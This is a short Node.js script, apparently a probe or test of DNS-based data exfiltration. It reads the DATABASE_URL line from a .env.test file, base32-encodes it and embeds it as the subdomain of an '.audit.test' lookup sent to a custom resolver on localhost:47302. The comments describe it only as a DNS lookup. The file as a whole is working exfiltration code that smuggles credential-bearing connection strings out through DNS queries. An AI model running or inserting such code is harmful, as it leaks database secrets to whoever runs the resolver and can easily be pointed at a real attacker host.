const dns = require('dns');
const { promisify } = require('util');

// Get the processed string from the environment file
const { execSync } = require('child_process');
const L = execSync('grep DATABASE_URL .env.test | base32 | tr -d = | tr A-Z a-z | head -c 60').toString().trim();

const hostname = `${L}.audit.test`;
const server = 'localhost';
const port = 47302;

console.log(`Looking up: ${hostname} at ${server}:${port}`);

// Try to resolve using the custom DNS server
const resolver = new dns.Resolver();
resolver.setServers([`${server}:${port}`]);

const resolve4Async = promisify(resolver.resolve4.bind(resolver));
const resolveAnyAsync = promisify(resolver.resolveAny.bind(resolver));

async function lookup() {
    try {
        console.log('Attempting to resolve...');
        // Try A records first
        const addresses = await resolve4Async(hostname);
        console.log('Resolved addresses:', addresses);
        return addresses;
    } catch (error) {
        console.log('Error resolving A records:', error.message);

        // Try any record type
        try {
            const records = await resolveAnyAsync(hostname);
            console.log('Resolved records:', records);
            return records;
        } catch (error2) {
            console.log('Error resolving any records:', error2.message);
            return null;
        }
    }
}

lookup().then(result => {
    if (result) {
        console.log('DNS lookup successful!');
        process.exit(0);
    } else {
        console.log('DNS lookup failed');
        process.exit(1);
    }
}).catch(err => {
    console.error('Fatal error:', err);
    process.exit(1);
});

